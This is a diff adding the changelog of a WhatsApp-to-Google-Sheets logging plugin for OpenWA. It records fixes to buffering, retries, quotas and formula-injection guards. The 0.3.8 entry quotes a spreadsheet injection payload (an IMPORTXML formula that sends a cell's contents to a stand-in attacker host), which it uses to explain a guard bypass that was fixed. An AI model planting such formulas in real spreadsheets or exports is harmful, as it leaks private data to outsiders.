@@ -1,0 +1,263 @@
+# Changelog
+
+All notable changes to the **Google Sheets Logger** plugin are documented here.
+
+The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
+and this plugin adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
+The version here always matches `manifest.json`'s `version`.
+
+## [Unreleased]
+
+## [0.3.14] - 2026-10-28
+
+### Changed
+
+- Align plugin metadata with OpenWA v0.26.0.
+- Correct the multi-sheet advice: OpenWA installs a plugin once per gateway, so there is no instance per session.
+
+## [0.3.13] - 2026-10-15
+
+### Changed
+
+- Align plugin metadata with OpenWA v0.25.0 and complete dashboard translations for all supported locales.
+
+### Fixed
+
+- Keep buffered rows and the previous destination when parking undelivered rows fails.
+- Persist destination fingerprints so retained rows cannot cross spreadsheets or service accounts after restart.
+- Checkpoint legacy buffer destinations before enabling hooks so an abrupt restart cannot retarget retained rows.
+- Serialize configuration updates so overlapping changes leave the latest destination active.
+
+## [0.3.12] - 2026-09-24
+
+### Added
+
+- Hindi (`hi`) dashboard text: the plugin name, description and config field titles.
+
+## [0.3.11] - 2026-09-24
+
+### Fixed
+
+- Message rows carry the message's own send time instead of the time the plugin handled it, so a
+  message delivered after a reconnect is logged at the time it was sent. Ack and failure rows keep
+  the handling time.
+
+## [0.3.10] - 2026-09-23
+
+### Changed
+
+- README: on Baileys, button, template and list replies log as `text` from OpenWA 0.23.6; orders and
+  product cards log as `order` and `product` from 0.23.5.
+- README: inbound messages on a chat another plugin holds in a `human` or `closed` handover are not
+  logged.
+- **Verified against OpenWA v0.23.6** (testedOpenWAVersion 0.23.4 -> 0.23.6).
+
+## [0.3.9] - 2026-09-05
+
+### Fixed
+
+- **A config edit that does not change the spreadsheet or credentials no longer discards the buffer.**
+  The host fires a config-change on every config write, and any write with rows still buffered parked
+  them under a key nothing ever reads. Lowering the flush interval during a Sheets outage therefore
+  destroyed the backlog, which is the opposite of the README's promise that buffered rows flush on
+  their own once the API is reachable. Rows are parked only when the destination actually moved, and
+  an eviction from that parked set is now reported instead of being silent.
+- A capped cell no longer ends in half a surrogate pair. Truncating at a fixed code-unit count could
+  split an emoji, leaving a lone surrogate that is not valid Unicode and cannot survive the UTF-8
+  encoding of the request body, on exactly the oversized sender-controlled message the cap exists for.
+
+### Changed
+
+- **Verified against OpenWA v0.23.4** (testedOpenWAVersion 0.23.3 -> 0.23.4).
+
+## [0.3.8] - 2026-08-25
+
+### Fixed
+
+- A formula that starts with a digit is neutralized. The spreadsheet guard checked only the character
+  after a leading `+`/`-`, so `-1+IMPORTXML("https://evil.tld/?d="&A2,"//a")` was written unquoted;
+  Excel and Sheets both parse a cell beginning `-1+` as a formula, and it fires on the CSV round-trip
+  this guard defends. Phone numbers, negative numbers and messages that merely open with one stay
+  readable, so nothing legitimate gained an apostrophe.
+- A failing flush no longer retries once per inbound message. The batch is restored on failure, so the
+  buffer stayed at or above `flushBatchSize` and every later message started another append: 30
+  messages produced 28 attempts against the `403 SERVICE_DISABLED` the setup guide tells operators to
+  expect, walking into Google's per-minute write quota. Retries now keep to `flushIntervalSec` until
+  one succeeds.
+- `flushIntervalSec` is capped at 2147483 seconds. Above that the delay overflows Node's 32-bit timer
+  and silently fires at about 1ms, which is the hot-loop the existing lower bound exists to prevent,
+  reached from the other end.
+
+### Changed
+
+- On the Baileys engine the `body` column is now populated for poll, contact card and button-reply rows
+  that previously logged an empty body, matching what the whatsapp-web.js engine has always logged.
+  OpenWA 0.23.2 fills the message body for these shapes. Shared events and button replies are logged
+  with `type` `unknown`; a poll is `poll` and a contact card is `contact`.
+- **Verified against OpenWA v0.23.3** (testedOpenWAVersion 0.23.0 → 0.23.3).
+
+## [0.3.7] - 2026-08-20
+
+### Changed
+
+- **Verified against OpenWA v0.23.0** (testedOpenWAVersion 0.22.0 → 0.23.0).
+
+## [0.3.6] - 2026-08-19
+
+### Changed
+
+- **Verified against OpenWA v0.22.0** (testedOpenWAVersion 0.20.0 → 0.22.0).
+
+## [0.3.5] - 2026-08-16
+
+### Changed
+
+- **Verified against OpenWA v0.20.0** (testedOpenWAVersion 0.19.0 → 0.20.0); the catalog download URL now pins #sha256= for production installs.
+
+## [0.3.4] — 2026-08-15
+
+### Fixed
+
+- **healthCheck now reports unhealthy while a flush is failing.** The plugin was green whenever a client
+  existed, so a spreadsheet that had stopped accepting appends looked fine while rows piled up. The last
+  flush error is surfaced alongside the buffered-row count.
+- **Undelivered rows no longer follow a spreadsheet rotation.** `onConfigChange` drains before swapping
+  the client, but a drain that cannot reach Sheets leaves every row in place — and those rows carry
+  message content captured under the previous spreadsheet and credentials. They are now parked under
+  their own storage key, reported once, and never sent to the new target.
+- **The buffer is now bounded by size, not only by row count.** The 5,000-row cap allowed cells of up
+  to 50,000 characters across 14 columns, so the row count alone permitted a buffer far larger than the
+  worker heap — reachable whenever Sheets is unreachable and the retain-on-failure path holds rows.
+  A total-character cap now applies alongside it, dropping oldest first.
+- **A restored buffer is filtered and capped as it loads, and says what it dropped.** Rows that are not
+  rows of strings are discarded rather than carried into the size accounting and the Sheets append, and
+  a buffer persisted before this cap existed no longer stays oversized until the next message arrives.
+- **A rejected `storage.set` on disable no longer escapes the lifecycle call.** Storage rejects at the
+  quota; the number of rows that failed to persist is now reported instead of lost without a trace.
+
+
+### Changed
+
+- **Compatibility re-verified against OpenWA v0.19.0** (testedOpenWAVersion 0.14.0 → 0.19.0). The
+  manifest passes the v0.19.0 host's load-time validation (manifest, ingress and main-entry
+  checks) and the built bundle loads under the loader contract. No capability surface this plugin
+  uses changed between 0.14 and 0.19; the v0.19 breaking changes are host-side (API key length,
+  removed REST endpoints, the plain-http install pin) and do not touch this plugin.
+
+## [0.3.3] — 2026-08-12
+
+### Changed
+
+- **Declared the `storage:use` permission.** Rows are batched in memory and the pending batch is kept
+  in plugin storage — restored when the plugin starts and written back when it stops — so a restart
+  between flushes does not lose what has not reached the sheet yet. OpenWA is moving `ctx.storage`
+  behind a permission the manifest has to declare, and without it that restore and that save are
+  refused: the plugin would keep logging happily and lose the pending batch on every restart, which
+  is exactly the failure the buffer exists to prevent. Declaring it changes nothing on the hosts you
+  run today — an unrecognized permission is ignored — so 0.3.3 behaves exactly like 0.3.2.
+
+## [0.3.2] — 2026-07-31
+
+### Fixed
+
+- **Logged rows could go missing when another plugin was also installed.** This plugin registered at the
+  default hook priority, tied with (or behind) plugins that end the event chain for the message they
+  handle. It now registers early, at observer priority, so it always sees a message before anything else
+  decides that message is spoken for.
+
+## [0.3.1] — 2026-07-30
+
+### Fixed
+
+- **Every non-text send failure was logged as a text message with an empty body.** `message:failed` used
+  to fire only from `sendText`, so hardcoding the `type` column to `text` and reading the body from
+  `input.text` was accurate. OpenWA 0.12 routes every sender through one shared failure path that carries
+  the real `type` — image, video, voice, audio, document, location, contact, poll, sticker, reply, forward
+  and bulk (not edit, which has no failure path of its own) — and a media send holds its caption in `caption`, not `text`. An audit sheet is only worth
+  what its worst row is worth: a failed invoice photo appeared as a `text` message with nothing in it.
+  The row now logs the reported type and falls back through `text` → `caption` → `body` for the content.
+  A payload with no `type` (an older host) still logs as `text`.
+  Bulk sends are a related case worth stating rather than a change: their payload is the shared
+  content, with the recipient on the enclosing item, so there is genuinely no `chatId` to log. Those
+  columns stay blank — the row is still attributable by session, error and timestamp.
+
+## [0.3.0] — 2026-07-23
+
+### Changed
+
+- **Outbound HTTP now goes through `ctx.net.fetch`** (host-proxied, SSRF-guarded) instead of the raw
+  worker `fetch`, bringing the plugin back inside the v0.7 net contract. The manifest declares
+  `permissions: ["net:fetch"]` and `net.allow: ["oauth2.googleapis.com", "sheets.googleapis.com"]` —
+  the only two hosts the plugin ever calls — and `minOpenWAVersion` rises to **0.7.0** accordingly.
+- **Documented that per-session spreadsheet routing is not supported.** The plugin holds one buffer and
+  one Sheets client built from the base `*` config, so a per-session config override that points at a
+  different `spreadsheetId` / `serviceAccountJson` is **not** honored — rows from every session land in
+  the single configured sheet. This is a deliberate single-sink design (the buffer cannot attribute a
+  row to a session at flush time), documented now in the README's **Compatibility** section rather than
+  left implicit. Per-session logging remains a roadmap item if a multi-sink need arises.
+
+## [0.2.3] — 2026-07-02
+
+### Fixed
+
+- **Oversized cell no longer stalls logging.** A message body longer than Google Sheets' 50 000-char
+  cell limit made the whole append batch fail with a 400 that was retained and retried forever,
+  blocking all logging. Every cell is now capped at 50 000 chars, so one long message can't poison the
+  pipeline.
+- **Formula-injection guard on free-text fields extended to `+`/`-`.** A leading `+`/`-` is now quoted
+  when it is not the start of a number, so an attacker-controlled sender name or body like
+  `-IMPORTXML(…)` / `+ HYPERLINK(…)` is neutralized on CSV export, while a phone number (`+62812…`) or a
+  negative number (`-5°C`) is still written unquoted.
+- **Sub-second flush interval floored to 1s.** A finite but tiny `flushIntervalSec` (e.g. `0.001`) was
+  accepted and hot-looped the flush timer; it is now floored to 1 second (the NaN/0/negative clamp is
+  unchanged).
+
+## [0.2.2] — 2026-06-23
+
+### Fixed
+
+- `flushIntervalSec` and `flushBatchSize` are now clamped to safe positive values. A non-numeric or
+  zero/negative interval previously coerced to `NaN`, which made the flush timer fire roughly every
+  millisecond (a hot-loop that burns CPU and Google Sheets API quota). Invalid values now fall back to
+  the documented defaults (5s / 20 rows).
+
+## [0.2.1] — 2026-06-23
+
+### Added
+
+- Localized dashboard text (`name`, `description`, config field titles) for es, fr, it, ar, he, te, zh-CN,
+  zh-HK via `manifest.i18n`. English remains the default + fallback. Translations are machine-generated;
+  human review recommended for ar/he/te.
+
+## [0.2.0] — 2026-06-22
+
+First packaged release. Built and reviewed against OpenWA v0.6.1.
+
+### Added
+
+- Buffered batch logging of WhatsApp message events (`message:received`, `message:sent`,
+  `message:failed`, `message:ack`) to a Google Sheet via a service-account JWT (RS256, signed with
+  Node's built-in `crypto` — no runtime dependencies).
+- 14-column row schema: `timestamp, sessionId, event, direction, chatId, from, to, senderName,
+  isGroup, type, body, messageId, ackStatus, error`.
+- Retain-on-failure flushing: rows are kept and retried on a Sheets error; buffer is capped at 5000
+  rows (oldest dropped past the cap, with a warning) and persisted to `ctx.storage` across restarts.
+- CSV / Google Sheets formula-injection neutralization, plus `valueInputOption=RAW` writes.
+- Plugin version surfaced at runtime — in the enable log line and the `healthCheck` message — baked
+  from `manifest.json` at build time.
+
+### Changed
+
+- Formula-injection guard split: ID/enum cells (chatId, from, to, messageId, status, type) keep the
+  full guard (`= + - @`); free-text cells (body, senderName, error) guard only `= @`, so legitimate
+  content like a phone number (`+62812…`) or a negative number is no longer prefixed with a quote.
+
+### Fixed
+
+- Data-loss race on disable: `onDisable` now awaits an in-flight flush (the flush guard is a Promise,
+  not a boolean), so rows restored after a failed flush are persisted instead of being overwritten by
+  an empty buffer.
+- `flushBuffer` is safe against concurrent buffer mutation — it takes ownership of the batch before
+  awaiting and restores it ahead of newer rows on failure.
+- `onConfigChange` drains the buffer to the current Sheets client before swapping it on a
+  spreadsheet/credential rotation, so pre-rotation rows land in the sheet they belong to.
